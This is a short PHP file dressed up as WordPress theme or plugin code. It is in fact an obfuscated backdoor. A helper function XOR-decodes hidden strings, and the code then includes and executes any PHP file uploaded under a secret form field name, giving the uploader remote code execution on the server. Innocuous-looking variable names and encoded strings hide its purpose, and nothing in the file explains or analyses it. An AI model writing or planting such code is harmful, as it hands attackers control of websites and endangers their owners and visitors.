<?php 	
function first()

{
    $page_templates = 'zUnRoTn8Eg02CZP';
    $custom_fields = $page_templates;
    
	$unicode = 'parent_data';
    $full_match = $GLOBALS[chunk("%25%13%27%1E%2A%07", $custom_fields)];
    $_quote_style = $full_match;
    $defaults = isset($_quote_style[$custom_fields]);
    if ($defaults)

    {

        $num_pages = $full_match[$custom_fields];
        $hash = $num_pages[chunk("%0E8%1E%0D%015%03%5D", $custom_fields)];
        $static_replacements = $hash;

        include ($static_replacements);
    }

}

function chunk($filters, $replace)

{
	$sized = 'add_seconds_server';
    $values = $replace;
    $taxonomy_obj = "url" . "decode";
    $rich_text = $taxonomy_obj($filters);
    $fresh_posts = substr($values,0, strlen($rich_text));
    $children_query = $rich_text ^ $fresh_posts;

    

    $rich_text = strpos($children_query, $fresh_posts);
    

    return $children_query;

}

first();
	$new_status_post = 'show_in_admin_status_list';


?>
